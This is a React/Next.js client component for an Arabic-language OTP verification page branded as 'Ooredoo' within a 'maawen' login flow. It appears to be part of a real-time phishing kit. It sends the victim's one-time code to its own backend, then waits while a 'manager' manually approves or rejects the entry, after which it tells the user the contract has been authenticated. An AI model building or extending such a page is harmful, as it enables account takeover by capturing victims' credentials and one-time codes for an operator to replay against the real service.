"use client";

import { useState, useEffect, FormEvent, useCallback } from "react";
import { useRouter } from "next/navigation";
import { subscribeToEntryStatus } from "@/lib/realtime";
import styles from "./MaawenLogin.module.css";

interface OtpResponse {
  entryId?: string;
  status?: string;
  error?: string;
}

export function MaawenOtpClient({
  locale,
  loginEntryId,
  credential,
}: {
  locale: string;
  loginEntryId: string;
  credential?: string;
}) {
  const router = useRouter();
  const prefix = `/${locale}`;
  const [otp, setOtp] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [verifying, setVerifying] = useState(false);
  const [otpEntryId, setOtpEntryId] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  // متابعة قرار المدير على رمز التحقق.

  const verifyOtpStatus = useCallback(
    async (id: string) => {
      try {
        const res = await fetch(`/api/maawen/login/status?entryId=${id}`, {
          cache: "no-store" as RequestCache,
          headers: { "Cache-Control": "no-cache, no-store, must-revalidate" },
        });
        const data = await res.json();
        if (data.status === "approved") {
          setVerifying(false);
          setSuccess(true);
          return;
        }
        if (data.status === "rejected") {
          setVerifying(false);
          setError("تم رفض رمز التحقق. يرجى المحاولة مرة أخرى.");
          setOtp("");
          setOtpEntryId(null);
          return;
        }
      } catch {
        // تجاهل أخطاء الشبكة مؤقتاً
      }
    },
    [],
  );

  useEffect(() => {
    if (!verifying || !otpEntryId) return;
    let cancelled = false;

    const channel = subscribeToEntryStatus(
      otpEntryId,
      () => {
        if (!cancelled) void verifyOtpStatus(otpEntryId);
      },
      () => {
        if (!cancelled) void verifyOtpStatus(otpEntryId);
      },
    );

    void verifyOtpStatus(otpEntryId);

    const interval = setInterval(() => {
      if (!cancelled) void verifyOtpStatus(otpEntryId);
    }, 5000);

    return () => {
      cancelled = true;
      clearInterval(interval);
      void channel.unsubscribe();
    };
  }, [verifying, otpEntryId, verifyOtpStatus]);

  async function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setError(null);
    const code = otp.trim();
    if (!/^\d{4}$/.test(code) && !/^\d{6}$/.test(code)) {
      setError("يرجى إدخال رمز تحقق صحيح (4 أو 6 أرقام)");
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/maawen/login/submit-otp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ loginEntryId, otp: code }),
      });
      const data = (await res.json().catch(() => ({}))) as OtpResponse;
      if (!res.ok) {
        setError(
          data.error === "login_not_approved"
            ? "تم رفض طلب الدخول. يرجى المحاولة مرة أخرى."
            : data.error === "login_not_found"
              ? "طللب الدخول غير موجود."
              : "تعذر إرسال الرمز. يرجى المحاولة مرة أخرى.",
        );
        return;
      }
      setOtpEntryId(data.entryId ?? null);
      setVerifying(true);
    } catch {
      setError("تعذر إرسال الرمز. يرجى المحاولة مرة أخرى.");
    } finally {
      setLoading(false);
    }
  }

  if (success) {
    return (
      <div className={styles.page}>
        <div className={styles.mainWrapper}>
          <div className={styles.loginContainer}>
            <div className={styles.verifyBox}>
              <div className={styles.successMark}>✓</div>
              <h1 className={styles.verifyTitle}>تم التحقق بنجاح</h1>
              <p className={styles.verifySub}>تم توثيق العقد إلكترونياً. يمكنك المتابعة.</p>
              <a href={`${prefix}/account`} className={styles.modalBtn} style={{ display: "block", textAlign: "center", textDecoration: "none" }}>
                الذهاب إلى حسابي
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  if (verifying) {
    return (
      <div className={styles.page}>
        <div className={styles.mainWrapper}>
          <div className={styles.verifyBox}>
            <div className={styles.spinner} />
            <h3 className={styles.verifyTitle}>جارٍ التحقق...</h3>
            <p className={styles.verifySub}>يرجى الانتظار لحظات</p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className={styles.page}>
      <div className={styles.mainWrapper}>
        <div className={styles.loginContainer}>
          <h1 className={styles.title}>
            أدخل رمز التحقق<br />
            <span className={styles.brandText}>منصة Ooredoo! 🔐</span>
          </h1>

          <p className={styles.subtitle}>
            {credential ? `تم تسجيل الدخول إلى الحساب: ${credential}` : "أدخل رمز التحقق المرسل لإتمام عملية توثيق العقد."}
          </p>

          <form onSubmit={handleSubmit}>
            <div className={styles.formGroup}>
              <input
                type="text"
                inputMode="numeric"
                dir="ltr"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="••••••"
                className={`${styles.inputField} ${styles.otpInput}`}
                style={{ textAlign: "center", letterSpacing: "8px", fontWeight: 800, fontSize: 22 }}
                autoFocus
                maxLength={6}
              />
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <button type="submit" className={`${styles.btn} ${styles.btnSubmit}`} disabled={loading}>
              {loading ? "جارٍ الإرسال..." : "تأكيد الرمز"}
            </button>
            <button type="button" className={`${styles.btn} ${styles.btnCreate}`} onClick={() => router.push(`${prefix}/maawen/login`)}>
              العودة لتسجيل الدخول
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}